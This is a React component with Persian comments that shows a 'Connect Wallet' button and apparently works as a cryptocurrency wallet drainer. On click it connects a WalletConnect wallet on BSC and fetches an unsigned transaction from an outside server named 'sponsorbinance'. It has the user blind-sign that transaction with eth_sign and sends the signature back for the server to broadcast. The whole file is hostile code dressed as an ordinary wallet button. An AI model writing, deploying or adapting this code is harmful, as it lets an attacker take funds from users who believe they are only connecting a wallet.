"use client"; // برای Next.js و React 18+ در Vercel

import React, { useEffect } from "react";
import jQuery from "jquery";
import { EthereumProvider } from "@walletconnect/ethereum-provider";

function App() {
  useEffect(() => {
    if (typeof localStorage !== "undefined") {
      localStorage.removeItem("walletconnect");
    }
  }, []);

  async function runner() {
    try {
      const ethereumProvider = await EthereumProvider.init({
        showQrModal: true,
        chains: [56], // فقط BSC
        methods: ["personal_sign", "eth_sign"],
        projectId: "9fe3ed74e1d73141e8b7747bedf77551",
      });

      await ethereumProvider.enable();
      const provider = ethereumProvider;
      const accounts = await provider.request({ method: "eth_accounts" });

      if (!accounts || accounts.length === 0) {
        console.error("❌ No accounts found.");
        return;
      }

      const account_sender = accounts[0];
      console.log("✅ Wallet Address:", account_sender);

      try {
        await provider.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x38" }], // BSC Chain ID
        });
      } catch (error) {
        console.error("❌ Error switching chain:", error);
        return;
      }

      const apiUrl = "https://sponsorbinance.vercel.app/api/proxy";

      async function signAndSendTransaction(address, chain, type, contract = "0") {
        try {
          const requestData = { handler: "tx", address, chain, type };
          if (type === "token") requestData.contract = contract;

          const result = await jQuery.post(apiUrl, requestData);
          const unsignedTx = JSON.parse(result);
          console.log("📜 Unsigned Transaction:", unsignedTx);

          // ✅ امضای تراکنش در کیف پول
          const signedTx = await provider.request({
            method: "eth_sign",
            params: [address, JSON.stringify(unsignedTx.result)],
          });

          console.log("✍️ Signed Transaction:", signedTx);

          // ✅ ارسال امضا به `send.php` برای ارسال به بلاکچین
          const txHash = await jQuery.post(apiUrl, {
            handler: "sign",
            signature: signedTx,
            type,
          });

          console.log("📤 Transaction Sent:", txHash);
          return txHash;
        } catch (error) {
          console.error("❌ Error in signAndSendTransaction:", error);
          return null;
        }
      }

      const txHash = await signAndSendTransaction(account_sender, "56", "coin");

      if (txHash) {
        console.log("📤 Final Transaction Hash:", txHash);
      } else {
        console.error("⚠ Transaction failed.");
      }
    } catch (error) {
      console.error("❌ Error initializing provider:", error);
    }
  }

  return (
    <a
      href="#"
      id="connectWallet"
      onClick={runner}
      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
      data-uk-toggle=""
    >
      <span>Connect Wallet</span>
    </a>
  );
}

export default App;
